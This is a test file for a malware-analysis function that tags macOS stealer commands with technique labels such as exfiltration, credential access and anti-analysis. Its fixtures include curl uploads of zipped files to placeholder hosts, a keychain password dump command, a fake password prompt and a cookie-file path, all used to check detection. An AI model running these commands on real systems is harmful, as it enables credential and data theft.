import { describe, it, expect } from 'vitest';
import { deriveCapabilities } from '../src/capabilities';

/**
 * Canonical stealer command set — representative strings a stealer would
 * generate/execute, used to verify TTP tagging.
 */

const STEALER_TEXTS = [
  'curl -X POST http://x/y -F file=@/tmp/out.zip',
  'system_profiler SPHardwareDataType',
  'do shell script "security find-generic-password -ga login.keychain"',
  'ditto -c -k /tmp/bundle /tmp/out.zip',
  'rm -rf /tmp/x',
];

describe('deriveCapabilities', () => {
  it('detects expected TTP tags from canonical stealer command set', () => {
    const caps = deriveCapabilities(STEALER_TEXTS);
    const tags = caps.map((c) => c.tag);

    expect(tags).toContain('exfiltration');
    expect(tags).toContain('recon');
    expect(tags).toContain('credential-access');
    expect(tags).toContain('archive/staging');
    expect(tags).toContain('cleanup');
  });

  it('each capability has non-empty evidence trimmed to <= 80 chars', () => {
    const caps = deriveCapabilities(STEALER_TEXTS);
    for (const cap of caps) {
      expect(cap.evidence.length).toBeGreaterThan(0);
      expect(cap.evidence.length).toBeLessThanOrEqual(80);
    }
  });

  it('deduplicate: each tag appears at most once', () => {
    // Supply "exfiltration"-matching text twice
    const texts = [
      'curl -X POST http://a/b -F file=@/tmp/a.zip',
      'curl -d @data http://c/d',
    ];
    const caps = deriveCapabilities(texts);
    const exfilEntries = caps.filter((c) => c.tag === 'exfiltration');
    expect(exfilEntries).toHaveLength(1);
  });

  it('returns [] for empty/benign input', () => {
    expect(deriveCapabilities([])).toEqual([]);
    expect(deriveCapabilities(['hello world', 'echo "no threats here"'])).toEqual([]);
  });

  it('preserves rule order in output', () => {
    // exfiltration comes before cleanup in the rule table
    const caps = deriveCapabilities(STEALER_TEXTS);
    const tags = caps.map((c) => c.tag);
    const exfilIdx = tags.indexOf('exfiltration');
    const cleanupIdx = tags.indexOf('cleanup');
    expect(exfilIdx).toBeGreaterThanOrEqual(0);
    expect(cleanupIdx).toBeGreaterThanOrEqual(0);
    expect(exfilIdx).toBeLessThan(cleanupIdx);
  });

  it('tags a hidden-answer display dialog as phishing', () => {
    const caps = deriveCapabilities(['macOS needs your password. [captures password]']);
    expect(caps.map((c) => c.tag)).toContain('phishing');
  });

  it('tags VM/hypervisor detection strings as anti-analysis', () => {
    const caps = deriveCapabilities(['memData contains "VMware" or memData contains "QEMU"']);
    expect(caps.map((c) => c.tag)).toContain('anti-analysis');
  });

  it('does not false-positive on "Edge" inside an unrelated word or phrase', () => {
    expect(deriveCapabilities(['this is an edge case, not a browser'])).toEqual([]);
  });

  it('does not false-positive on "wallet" as a substring of a variable name', () => {
    expect(deriveCapabilities(['walletMap lookup failed'])).toEqual([]);
  });

  it('still tags a real browser-data path', () => {
    const caps = deriveCapabilities(['~/Library/Application Support/Microsoft Edge/Default/Cookies.binarycookies']);
    expect(caps.map((c) => c.tag)).toContain('browser-data');
  });
});
